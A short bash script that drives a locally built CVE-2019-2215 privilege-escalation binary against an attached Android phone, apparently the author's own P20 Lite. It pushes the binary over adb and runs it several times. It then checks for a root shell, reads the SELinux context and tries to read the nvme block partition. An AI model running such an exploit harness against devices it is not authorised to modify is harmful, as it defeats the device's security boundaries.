#!/bin/bash
# Push the swapped binary and test whether the cred-SID write moves us out of the
# shell SELinux domain. Waits briefly for adb authorisation if needed.
set -u
cd /home/placeless/dev/p20lite-cve
BIN=libs/arm64-v8a/cve-2019-2215

echo "############ wait for an authorised device"
for i in $(seq 1 30); do
  ST=$(timeout 20 adb devices 2>/dev/null | awk 'NR==2{print $2}')
  echo "  adb state: ${ST:-none}"
  [ "$ST" = "device" ] && break
  sleep 10
done
if [ "$(timeout 20 adb devices 2>/dev/null | awk 'NR==2{print $2}')" != "device" ]; then
  echo ">>> still not authorised. Tap 'allow' on the phone screen (USB debugging)."
  exit 1
fi

echo
echo "############ device state"
timeout 30 adb shell 'getprop ro.build.display.id; cat /proc/version' 2>&1 | head -3
ls -la "$BIN"
md5sum "$BIN"

echo
echo "############ push the swapped build"
timeout 60 adb push "$BIN" /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

echo
echo "############ run: does the domain move and can we touch nvme?"
for i in 1 2 3; do
  echo "--- attempt $i"
  printf 'id\ncat /proc/self/attr/current\ngetenforce\ndd if=/dev/block/bootdevice/by-name/nvme of=/dev/null bs=512 count=1 2>&1\n' \
    | timeout 120 adb shell /data/local/tmp/cve-2019-2215 > "/tmp/sw_$i.out" 2>&1
  OUT=$(tr -d '\000' < "/tmp/sw_$i.out")
  echo "    root: $(echo "$OUT" | grep -ac 'uid=0(root)')"
  echo "    ctx : $(echo "$OUT" | grep -a 'context=' | tail -1 | cut -c1-70)"
  echo "    dd  : $(echo "$OUT" | grep -aE 'Permission|records in|records out' | tail -1)"
  if echo "$OUT" | grep -aq "uid=0(root)" && ! echo "$OUT" | grep -aq "Permission denied"; then
    echo "    >>>>>> DOMAIN MOVED AND BLOCK ACCESS GRANTED <<<<<<"
    echo "$OUT" | tail -12
    exit 0
  fi
  if echo "$OUT" | grep -aq "uid=0(root)"; then
    echo "    (root yes, still denied)"
  fi
  sleep 4
done
echo
echo "### last output:"; tr -d '\000' < /tmp/sw_3.out | tail -10
